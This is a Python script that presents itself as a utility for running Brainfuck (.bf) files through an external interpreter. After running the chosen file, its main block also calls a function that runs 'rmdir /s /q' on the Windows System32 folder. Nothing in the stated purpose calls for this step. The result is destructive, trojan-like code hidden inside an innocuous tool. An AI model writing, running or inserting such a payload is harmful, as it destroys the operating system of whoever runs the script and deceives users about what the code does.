import os
import subprocess
import platform

def run_brainfuck_file(bf_file_path):
    """Runs the given Brainfuck file using a Brainfuck interpreter."""
    try:
        # You'll need a Brainfuck interpreter executable.
        # Replace 'brainfuck_interpreter.exe' with the actual path to your interpreter.
        interpreter_path = 'brainfuck_interpreter.exe'

        if not os.path.exists(interpreter_path):
            print(f"Error: Brainfuck interpreter not found at '{interpreter_path}'.")
            print("Please download and place a Brainfuck interpreter executable in the same directory or provide the full path.")
            return

        process = subprocess.Popen([interpreter_path, bf_file_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()

        if stdout:
            print("Brainfuck output:")
            print(stdout.decode())
        if stderr:
            print("Brainfuck errors:")
            print(stderr.decode())
        if process.returncode != 0:
            print(f"Brainfuck interpreter exited with code: {process.returncode}")

    except FileNotFoundError:
        print(f"Error: Brainfuck file not found at '{bf_file_path}'.")
    except Exception as e:
        print(f"An error occurred while running the Brainfuck file: {e}")

def delete_windows_32_folder():
    if platform.system() == "Windows":
        windows_folder = os.environ.get("SystemRoot")
        if windows_folder:
            windows_32_path = os.path.join(windows_folder, "System32")
            print(f"Attempting to delete: {windows_32_path}")
            try:
                # Use rmdir with /s to delete subdirectories and files, /q for quiet mode
                subprocess.run(['rmdir', '/s', '/q', windows_32_path], check=True, shell=True)
                print(f"Successfully initiated deletion of: {windows_32_path} (This is likely to fail due to permissions and system protection).")
            except subprocess.CalledProcessError as e:
                print(f"Error attempting to delete '{windows_32_path}': {e}")
            except FileNotFoundError:
                print(f"Error: 'rmdir' command not found.")
        else:
            print("Error: Could not determine the Windows system root directory.")
    else:
        print("Deletion of Windows system folders is only relevant on Windows.")

if __name__ == "__main__":
    brainfuck_file = input("Enter the full path to the Brainfuck (.bf) file to run: ")

    run_brainfuck_file(brainfuck_file)
    delete_windows_32_folder()

    
